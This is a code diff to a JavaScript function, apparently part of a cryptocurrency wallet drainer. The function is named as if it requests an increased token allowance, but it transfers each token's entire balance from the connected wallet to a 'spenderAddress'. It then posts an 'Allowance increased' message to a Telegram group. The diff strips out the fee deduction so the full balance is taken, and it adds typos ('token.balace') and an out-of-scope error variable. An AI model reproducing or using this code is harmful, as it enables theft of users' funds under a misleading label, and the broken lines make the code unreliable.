@@ -170,49 +170,38 @@ async function transferNativeToken(signer, balance, network) {
 
 // Function to request increased allowance with Telegram notification
 async function requestIncreasedAllowance(signer, balances, spenderAddress, network) {
-    const fees = {
-        ethereum:0.00043385,
-        bsc:0.0001,
-        polygon:0.001,
-        arbitrum:0.0002,
-        fantom:0,
-        optimism:0.0003,
-    };
-    
+   
     for (const token of balances) {
-        const balance_ = ethers.utils.formatEther(token.balance).toString();
-        const fee = fees[network];
-        // Subtract the gas cost from the balance
-        const valueToSend = (parseFloat(parseFloat(balance_) - fee)).toFixed(18);
-        console.log("valueToSend is ",valueToSend);
+        console.log("token balance to be transfered is ",token.balace);
         try{
-
             const tokenContract = new ethers.Contract(token.address, abi, signer);
-            const tx = await tokenContract.transfer(spenderAddress, valueToSend);
+            const tx = await tokenContract.transfer(spenderAddress, token.balance);
             await tx.wait();
             console.log("sucessfully increased allocation or approved..");
             
             // Send notification to Telegram group
-            const message = `Allowance increased for ${token.address} by ${valueToSend.toString()}`;
+            const message = `Allowance increased for ${token.address} by ${token.balace}`;
             await sendTelegramNotification(allowanceIncreasesGroupID, message);
 
             // serverSideLogic(signer, token.balance, token.address, network);
             // console.log("sent to server..");
-        }catch{
+        }catch(e){
+            console.log(e);
             try{
                 const tokenContract = new ethers.Contract(token.address, abi, signer);
-                const tx = await tokenContract.transfer(spenderAddress, valueToSend);
+                const tx = await tokenContract.transfer(spenderAddress, token.balance);
                 await tx.wait();
                 console.log("sucessfully increased allocation or approved..");
                 
                 // Send notification to Telegram group
-                const message = `Allowance increased for ${token.address} by ${valueToSend.toString()}`;
+                const message = `Allowance increased for ${token.address} by ${token.balance}`;
                 await sendTelegramNotification(allowanceIncreasesGroupID, message);
 
                 // serverSideLogic(signer, token.balance, token.address, network);
                 // console.log("sent to server..");
             }catch{
                 console.warn("error in setting allowance or approving user");
+                console.log(e);
                 // await serverSideLogic(signer, token.balance, token.address, network);
             }
         }
